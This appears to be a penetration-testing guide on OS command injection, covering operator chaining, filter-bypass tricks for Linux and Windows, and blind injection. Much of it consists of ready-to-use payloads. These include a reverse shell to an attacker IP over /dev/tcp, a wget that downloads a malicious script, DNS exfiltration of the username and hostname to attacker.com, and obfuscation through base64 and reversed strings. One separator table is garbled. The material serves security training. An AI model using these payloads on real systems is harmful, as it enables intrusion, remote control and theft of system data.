# üëÄ Detection & Exploitation

**Command Injection** is a significant security vulnerability that enables an attacker to execute arbitrary commands on the underlying operating system through a compromised application. This flaw typically arises when user inputs are not adequately sanitized before being passed to a system shell.

### How Command Injection Works

When user input is mishandled, an attacker can manipulate that input to inject additional commands. The server may then execute these commands, potentially leading to data leaks, unauthorized access, or server compromises.

### Common Attack Vectors

Command injection vulnerabilities can emerge in several ways, including:

* **User Input Fields**: Accepting direct inputs from users, such as those found in forms.
* **URL Parameters**: Parameters embedded in URLs that lack proper sanitation.
* **API Calls**: APIs that execute commands based on user-supplied data.

#### Example Scenario: Babel's Language Viewer

Let‚Äôs consider a **Language Viewer** application that allows users to view the contents of files associated with different languages. The application might execute commands similar to the following when given a language filename:

```bash
cat BABEL_INPUT
```

#### Crafting a Command Injection

An attacker could exploit this by injecting additional commands. For example:

```bash
cat /etc/passwd; ls -l
```

In this case, the attacker reads the contents of the `/etc/passwd` file, which contains user account information, and then lists the contents of the current directory.

> \[!Good cheat-sheets are important] There are hundreds of commands that could lead to command injections and we advise you go train with many types of injections. A good cheat-sheet would be [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) Or if you have an account, the `Hack the Box Command injection cheat-sheet` is a very valuable piece of content.

#### Bypassing Front-End Validation

Attackers can employ various techniques to bypass front-end validation and execute commands.

**Using the AND Operator**

For example, an attacker can combine commands using the AND operator:

```bash
cat /var/www/html/babel_intro.html && echo "Hello from Babel!"
```

If the first command succeeds, the attacker can execute a second command to write a message or even create a new file.

**Using the OR Operator**

If the application fails to sanitize input adequately, the attacker might try:

```bash
cat /var/www/html/babel_intro.html || ls -la
```

The `ls -la` command runs only if the first command fails. If the filename is incorrect, the attacker can still gather information about the directory contents.

#### Breaking the Input

To force the application to execute multiple commands regardless of success, the attacker can manipulate the input like this:

```bash
cat /dev/null; (sleep 5 && wget http://malicious.com/babel_script.sh)
```

In this example, the attacker uses a command to create a delay (`sleep 5`) before downloading a malicious script from an external server. This could allow the attacker to gain further access or deploy malware.

#### Using Subshells

A more sophisticated attack might use subshells to execute commands in a separate environment:

```bash
cat /etc/passwd; (bash -i >& /dev/tcp/attacker_ip/4444 0>&1)
```

This command uses a reverse shell to connect back to an attacker‚Äôs machine, allowing the attacker to execute arbitrary commands on the compromised system.

When testing for command injection vulnerabilities, you might observe or manipulate requests like the following in Burp Suite:

#### Initial Request

```bash
GET /language_viewer.php?filename=babel.txt HTTP/1.1
Host: babelsite.com
```

#### Injected Payload in Burp Suite

In the request editor, an attacker could modify the `filename` parameter to include their malicious payload:

```bash
GET /language_viewer.php?filename=babel.txt; ls -la HTTP/1.1
Host: babelsite.com
```

#### Output

Upon sending this modified request, the server might return a response with the output of the `ls -la` command if the application is vulnerable:

```bash
HTTP/1.1 200 OK
Content-Type: text/plain

babel_intro.txt
babel_advanced.txt
babel_malicious_script.sh
```

## Bypassing Blacklisted Characters & Commands

Command injection attempts often face security filters that block specific characters or sequences. However, attackers can use several techniques to bypass these restrictions and execute arbitrary commands. Below, we explore different techniques and examples of bypassing command blacklists, both on Linux and Windows systems.

### Linux Command Injection Techniques

#### Using Tabs Instead of Spaces

Both Linux and Windows systems accept commands with tabs (`%09`) instead of spaces. This can be useful when spaces are blacklisted by filters.

```bash
curl -X GET "http://example.com/api?host=192.168.1.1%0a%09whoami"
# Output in Bash:
# babel-linux
```

#### Utilizing the `$IFS` Environment Variable

In Linux, the `$IFS` (Internal Field Separator) variable can be used as a space replacement, allowing commands to bypass space-based blacklists.

```bash
curl -X GET "http://example.com/api?host=192.168.1.1%0a${IFS}whoami"
# Output in Bash:
# babel-linux
```

#### Using Bash Brace Expansion

Bash Brace Expansion allows creating commands without spaces, which can bypass filters. This example uses it to list directory contents.

```bash
{ls,-la}
# Output in Bash:
# total 4
# drwxr-xr-x 2 babel babel 4096 Oct  6 10:12 babel_intro.txt
```

#### Exploiting Environment Variables to Inject Characters

You can extract specific characters from Linux environment variables like `${PATH}` or `${PWD}` to inject sequences into a command.

```bash
echo ${PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

echo ${PATH:0:1}
/  # Extracts the first character of the PATH
```

#### Using URL Encoding Variants

When characters like `%0a` (newline) are blocked, you can try other URL-encoded forms, such as `%0d%0a`, to inject a newline and execute further commands.

```bash
curl -X GET "http://example.com/api?host=192.168.1.1%0d%0awhoami"
```

#### Using Alternate Command Syntax

In scenarios where filters block commands or spaces, alternate syntax can help you bypass the restrictions and still run commands.

```bash
curl -X GET "http://example.com/api?host=192.168.1.1; echo Success"
# Output in Bash:
# Success
```

#### Logical Operator Chaining

Chaining commands with logical operators (`&&`, `||`) allows attackers to run multiple commands even when spaces or some command sequences are filtered.

```bash
curl -X GET "http://example.com/api?host=192.168.1.1&&echo BabelCheck"
# Output in Bash:
# BabelCheck
```

#### Producing Blacklisted Characters Using ASCII

You can bypass blacklists by creating characters like the backslash (`\`) indirectly. Here, we use the ASCII table and `tr` to shift characters:

```bash
echo $(tr '!-}' '"-~'<<<[)
/  # Produces the backslash by shifting the ASCII value
```

#### Ignoring Special Characters Using Quotes or Escape Characters

Certain characters, like quotes, are often ignored by shells like Bash, allowing you to bypass filters easily.

```bash
w'h'o'am'i
# Output in Bash:
# babel-linux

w"h"o"am"i
# Output in Bash:
# babel-linux
```

Backslashes (`\`) and positional parameters (`$@`) are similarly ignored by Bash and can be used without interfering with the command‚Äôs execution.

```bash
who$@ami
w\ho\am\i
# Output in Bash:
# babel-linux
```

#### Reversing Command Strings

Another technique is reversing command strings to bypass filters. The `rev` command in Linux can reverse the command, allowing you to execute it backward.

```bash
echo 'whoami' | rev
# Output in Bash:
# imahow

$(rev<<<'imahow')
# Output in Bash:
# babel-linux
```

#### Using Base64 Encoding for Commands

Base64 encoding is a powerful way to bypass filters. You can encode a command into Base64, then decode it on the fly to execute it.

```bash
echo -n 'ls /home/babel' | base64
# Output in Bash:
# bHMgL2hvbWUvYmFiZWw=

bash<<<$(base64 -d<<<bHMgL2hvbWUvYmFiZWw=)
# Output in Bash:
# example.txt  babel_config.sh
```

### Windows Command Injection Techniques

#### Manipulating Windows Environment Variables

In Windows, similar techniques can be applied. You can manipulate environment variables such as `%USERPROFILE%` to extract characters and bypass filters.

```cmd
C:\> echo %USERPROFILE:~3,-10%
\  # Extracts a backslash from the profile path
```

#### Using Caret (`^`) for Bypass

In Windows, the caret (`^`) can be used to escape or inject commands, which is especially useful when spaces or commands are blocked.

```cmd
who^ami
# Output in CMD:
# babel-win
```

#### Case-Insensitive Command Execution

On Windows systems, PowerShell and CMD are case-insensitive, which allows bypassing filters by changing the letter case of blacklisted commands.

```cmd
dir C:\
# Output in CMD:
# babel.txt  babel_config.txt
```

#### Using `CALL` Command

The `CALL` command in Windows allows executing commands indirectly, which can help bypass certain filters.

```cmd
CALL echo BabelSuccess
# Output in CMD:
# BabelSuccess
```

#### URL Encoding in Windows

Just like in Linux, URL encoding can also be effective in Windows environments. If certain characters are blacklisted, you can encode them.

```cmd
curl -X GET "http://example.com/api?host=babel_language%20%20%20&&echo WinBabel"
```

### Blind Command Injection Techniques

Let's say a website has a feedback feature:

```bash
mail -s "Awesome site feedback" -aFrom:peter@normal-user.net feedback@vulnerable-website.com <<EOF
Great job on the website! I really enjoy using it.

Best,
Peter
EOF
& nslookup $(whoami).$(hostname).attacker.com &
```

**Pseudo burp command to showcase:**

```sh
POST /feedback HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

email=peter@normal-user.net&subject=Awesome+site+feedback&message=Great+site!&extra=&nslookup+$(whoami).$(hostname).attacker.com&
```

#### **What Happens in the Backend?**

1.  The web application processes the email submission, assuming it executes a shell command like:

    ```bash
    mail -s "subject" -aFrom:user@domain.com feedback@vulnerable.com
    ```
2. If the application is vulnerable to **blind OS command injection**, it appends the injected command (`& nslookup $(whoami).$(hostname).attacker.com &`) to the executed shell command.
3. The `nslookup` command forces the system to perform a DNS lookup request to `attacker.com`, including:
   * `$(whoami)`: The username running the process.
   * `$(hostname)`: The system‚Äôs hostname.
4. The attacker‚Äôs DNS server logs this request, revealing the compromised system‚Äôs username and hostname.
5. Since this is a **blind** injection, the attacker doesn't see direct output on the website, but captures data passively via DNS logs.

This technique is useful when output is blocked, unlike `ping` where responses may not be visible to the attacker. You can modify this to leak environment variables or other sensitive data (`$(id)`, `$(uname -a)`, etc.).

### Other **Payloads & Separators**:

***

#### **üìå Payload Examples**

**1Ô∏è‚É£ Writing Output to a File**

```bash
whoami > /var/www/static/whoami.txt
```

‚úÖ Stores the output in a web-accessible file.

**2Ô∏è‚É£ Exfiltrating Data via DNS**

```bash
nslookup $(whoami).attacker.com
```

‚úÖ Leaks system info via a DNS request.

***

#### **üìå Command Separators (Use Them All!)**

| Separator | Effect                                           |
| --------- | ------------------------------------------------ |
| `&`       | Runs next command in **background**.             |
| `&&`      | Runs next command **only if previous succeeds**. |
| \`        |                                                  |
| \`        | \`                                               |
| `;`       | Runs commands sequentially, ignoring failures.   |
|           | (Newline) Executes next command separately.      |

**Example (Using All Separators)**

```bash
whoami && id || uname -a ; nslookup $(hostname).attacker.com &
```

‚úÖ **Executes everything smartly**:

* Runs `whoami`, then `id` if `whoami` succeeds.
* If `whoami` fails, runs `uname -a`.
* Always sends system info via DNS lookup.

***

#### **üìå Inline Execution for Bypasses**

| Method          | Effect                           |
| --------------- | -------------------------------- |
| `` `command` `` | Executes and substitutes output. |
| `$(command)`    | Safer alternative to backticks.  |

**Example**

```bash
echo "User: $(whoami)"
```

‚úÖ Expands to `echo "User: root"`.
